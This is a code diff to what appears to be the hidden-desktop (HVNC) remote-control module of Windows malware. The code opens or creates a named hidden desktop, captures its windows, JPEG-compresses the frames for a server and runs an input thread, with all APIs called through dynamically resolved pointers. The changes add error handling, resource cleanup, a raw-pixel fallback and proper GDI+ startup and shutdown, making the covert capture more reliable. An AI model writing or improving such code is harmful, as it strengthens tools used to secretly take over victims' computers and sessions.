@@ -34,29 +34,75 @@ static BYTE      *g_tempPixels = NULL;
 static HDESK      g_hDesk;
 static BITMAPINFO g_bmpInfo;
 static HANDLE     g_hInputThread, g_hDesktopThread;
+static ULONG_PTR  g_gdiplusToken;
+static BOOL       g_gdiplusStarted = FALSE;
 static char       g_desktopName[MAX_PATH];
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
-void BitmapToJpg(HDC *hDc, HBITMAP *hbmpImage, int width, int height)
+static void FreePixelBuffers()
 {
-    static ULONG_PTR gdiplusToken;
-    GdiplusStartupInput gdiplusStartupInput;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-    Funcs::pSelectObject(*hDc, hbmpImage);
-    Funcs::pBitBlt(*hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
+    Funcs::pFree(g_pixels);
+    Funcs::pFree(g_oldPixels);
+    Funcs::pFree(g_tempPixels);
+    g_pixels = NULL;
+    g_oldPixels = NULL;
+    g_tempPixels = NULL;
+}
 
+static BOOL BitmapToJpg(HDC hDc, HBITMAP hBmpImage, int height)
+{
+    BOOL ret = FALSE;
+    HBITMAP hBmpCopy = NULL;
     IStream *jpegStream = NULL;
-    CreateStreamOnHGlobal(NULL, TRUE, &jpegStream);
-    Bitmap *Image = Bitmap::FromHBITMAP(*hbmpImage, NULL);
-    Image->Save(jpegStream, &jpegID, NULL);
+    Bitmap *image = NULL;
+    Bitmap *jpeg = NULL;
+    HBITMAP compressedImage = NULL;
+    LARGE_INTEGER streamOffset = { 0 };
 
-    Bitmap *JPEG = Bitmap::FromStream(jpegStream);
-    HBITMAP compressedImage;
-    JPEG->GetHBITMAP(Color::White, &compressedImage);
-    Funcs::pGetDIBits(*hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO *)&g_bmpInfo, DIB_RGB_COLORS);
-    //GdiplusShutdown(gdiplusToken);
-    delete Image, jpegStream;
+    if (!g_gdiplusStarted)
+        goto exit;
+
+    // FromHBITMAP rejects bitmaps that are or were selected into a DC
+    hBmpCopy = (HBITMAP)CopyImage(hBmpImage, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
+    if (!hBmpCopy)
+        goto exit;
+
+    if (CreateStreamOnHGlobal(NULL, TRUE, &jpegStream) != S_OK || !jpegStream)
+        goto exit;
+
+    image = Bitmap::FromHBITMAP(hBmpCopy, NULL);
+    if (!image || image->GetLastStatus() != Ok)
+        goto exit;
+
+    if (image->Save(jpegStream, &jpegID, NULL) != Ok)
+        goto exit;
+
+    if (jpegStream->Seek(streamOffset, STREAM_SEEK_SET, NULL) != S_OK)
+        goto exit;
+
+    jpeg = Bitmap::FromStream(jpegStream);
+    if (!jpeg || jpeg->GetLastStatus() != Ok)
+        goto exit;
+
+    if (jpeg->GetHBITMAP(Color::White, &compressedImage) != Ok)
+        goto exit;
+
+    if (Funcs::pGetDIBits(hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO *)&g_bmpInfo, DIB_RGB_COLORS) != height)
+        goto exit;
+
+    ret = TRUE;
+
+exit:
+    if (compressedImage)
+        Funcs::pDeleteObject(compressedImage);
+    delete jpeg;
+    delete image;
+    if (hBmpCopy)
+        Funcs::pDeleteObject(hBmpCopy);
+    if (jpegStream)
+        jpegStream->Release();
+    return ret;
 }
 
 static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
@@ -67,8 +113,13 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
 
     HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
     HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
+    HGDIOBJ hOldBmpWindow = NULL;
+    if (!hDcWindow || !hBmpWindow)
+        goto exit;
 
-    Funcs::pSelectObject(hDcWindow, hBmpWindow);
+    hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
+    if (!hOldBmpWindow)
+        goto exit;
     if (Funcs::pPrintWindow(hWnd, hDcWindow, 0))
     {
         Funcs::pBitBlt(hDcScreen,
@@ -83,8 +134,12 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
 
         ret = TRUE;
     }
-    Funcs::pDeleteObject(hBmpWindow);
-    Funcs::pDeleteDC(hDcWindow);
+    Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
+exit:
+    if (hBmpWindow)
+        Funcs::pDeleteObject(hBmpWindow);
+    if (hDcWindow)
+        Funcs::pDeleteDC(hDcWindow);
     return ret;
 }
 
@@ -124,18 +179,39 @@ static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
     return TRUE;
 }
 
+// Returns TRUE when there is no frame to send: unchanged pixels or capture failure
 static BOOL GetDeskPixels(int serverWidth, int serverHeight)
 {
+    BOOL captureSuccess = FALSE;
+    BOOL comparePixels = TRUE;
+    HDC hDc = NULL;
+    HDC hDcScreen = NULL;
+    HDC hDcScreenResized = NULL;
+    HBITMAP hBmpScreen = NULL;
+    HBITMAP hBmpScreenResized = NULL;
+    HGDIOBJ hOldBmpScreen = NULL;
+    HGDIOBJ hOldBmpScreenResized = NULL;
+    EnumHwndsPrintData data;
     RECT rect;
     HWND hWndDesktop = Funcs::pGetDesktopWindow();
     Funcs::pGetWindowRect(hWndDesktop, &rect);
 
-    HDC     hDc = Funcs::pGetDC(NULL);
-    HDC     hDcScreen = Funcs::pCreateCompatibleDC(hDc);
-    HBITMAP hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
-    Funcs::pSelectObject(hDcScreen, hBmpScreen);
+    hDc = Funcs::pGetDC(NULL);
+    if (!hDc)
+        goto cleanup;
 
-    EnumHwndsPrintData data;
+    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
+    if (!hDcScreen)
+        goto cleanup;
+
+    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
+    if (!hBmpScreen)
+        goto cleanup;
+
+    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
+    if (!hOldBmpScreen)
+        goto cleanup;
+
     data.hDc = hDc;
     data.hDcScreen = hDcScreen;
 
@@ -148,45 +224,94 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
 
     if (serverWidth != rect.right || serverHeight != rect.bottom)
     {
-        HBITMAP hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
-        HDC     hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);
+        hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
+        if (!hBmpScreenResized)
+            goto cleanup;
 
-        Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
+        hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);
+        if (!hDcScreenResized)
+            goto cleanup;
+
+        hOldBmpScreenResized = Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
+        if (!hOldBmpScreenResized)
+            goto cleanup;
         Funcs::pSetStretchBltMode(hDcScreenResized, HALFTONE);
-        Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
-            hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY);
+        if (!Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
+            hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY))
+        {
+            goto cleanup;
+        }
 
+        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
+        hOldBmpScreen = NULL;
         Funcs::pDeleteObject(hBmpScreen);
         Funcs::pDeleteDC(hDcScreen);
 
         hBmpScreen = hBmpScreenResized;
         hDcScreen = hDcScreenResized;
+        hOldBmpScreen = hOldBmpScreenResized;
+        hBmpScreenResized = NULL;
+        hDcScreenResized = NULL;
+        hOldBmpScreenResized = NULL;
     }
 
-    BOOL comparePixels = TRUE;
     g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;
 
     if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
     {
-        Funcs::pFree((HLOCAL)g_pixels);
-        Funcs::pFree((HLOCAL)g_oldPixels);
-        Funcs::pFree((HLOCAL)g_tempPixels);
+        FreePixelBuffers();
 
         g_pixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
         g_oldPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
         g_tempPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
 
         comparePixels = FALSE;
+        if (!g_pixels || !g_oldPixels || !g_tempPixels)
+        {
+            FreePixelBuffers();
+            goto cleanup;
+        }
     }
 
     g_bmpInfo.bmiHeader.biWidth = serverWidth;
     g_bmpInfo.bmiHeader.biHeight = serverHeight;
-    //Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS);
-    BitmapToJpg(&hDcScreen, &hBmpScreen, serverWidth, serverHeight);
 
-    Funcs::pDeleteObject(hBmpScreen);
-    Funcs::pReleaseDC(NULL, hDc);
-    Funcs::pDeleteDC(hDcScreen);
+    if (!Funcs::pBitBlt(hDcScreen, 0, 0, serverWidth, serverHeight, hDc, 0, 0, SRCCOPY))
+        goto cleanup;
+
+    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
+    hOldBmpScreen = NULL;
+
+    if (BitmapToJpg(hDcScreen, hBmpScreen, serverHeight))
+        captureSuccess = TRUE;
+    // Fall back to raw pixels if GDI+ JPEG encoding fails
+    else if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
+        captureSuccess = TRUE;
+
+cleanup:
+    if (hOldBmpScreenResized && hDcScreenResized)
+        Funcs::pSelectObject(hDcScreenResized, hOldBmpScreenResized);
+    if (hBmpScreenResized)
+        Funcs::pDeleteObject(hBmpScreenResized);
+    if (hDcScreenResized)
+        Funcs::pDeleteDC(hDcScreenResized);
+
+    if (hOldBmpScreen && hDcScreen)
+        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
+    if (hBmpScreen)
+        Funcs::pDeleteObject(hBmpScreen);
+    if (hDc)
+        Funcs::pReleaseDC(NULL, hDc);
+    if (hDcScreen)
+        Funcs::pDeleteDC(hDcScreen);
+
+    if (!captureSuccess)
+    {
+        g_bmpInfo.bmiHeader.biWidth = 0;
+        g_bmpInfo.bmiHeader.biHeight = 0;
+        // Treat a failed capture as an unchanged frame so the caller skips it
+        return TRUE;
+    }
 
     if (comparePixels)
     {
@@ -879,24 +1004,36 @@ static DWORD WINAPI MainThread(LPVOID param)
     g_bmpInfo.bmiHeader.biCompression = BI_RGB;
     g_bmpInfo.bmiHeader.biClrUsed = 0;
 
+    GdiplusStartupInput gdiplusStartupInput;
+    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Ok)
+        g_gdiplusStarted = TRUE;
+
     g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
     if (!g_hDesk)
         g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
     Funcs::pSetThreadDesktop(g_hDesk);
 
     g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
-    Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
+    if (g_hInputThread)
+        Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
+    if (g_hDesktopThread)
+        Funcs::pWaitForSingleObject(g_hDesktopThread, INFINITE);
 
-    Funcs::pFree(g_pixels);
-    Funcs::pFree(g_oldPixels);
-    Funcs::pFree(g_tempPixels);
+    if (g_gdiplusStarted)
+    {
+        GdiplusShutdown(g_gdiplusToken);
+        g_gdiplusStarted = FALSE;
+    }
 
-    Funcs::pCloseHandle(g_hInputThread);
-    Funcs::pCloseHandle(g_hDesktopThread);
+    FreePixelBuffers();
 
-    g_pixels = NULL;
-    g_oldPixels = NULL;
-    g_tempPixels = NULL;
+    if (g_hInputThread)
+        Funcs::pCloseHandle(g_hInputThread);
+    if (g_hDesktopThread)
+        Funcs::pCloseHandle(g_hDesktopThread);
+
+    g_hInputThread = NULL;
+    g_hDesktopThread = NULL;
     g_started = FALSE;
     return 0;
 }
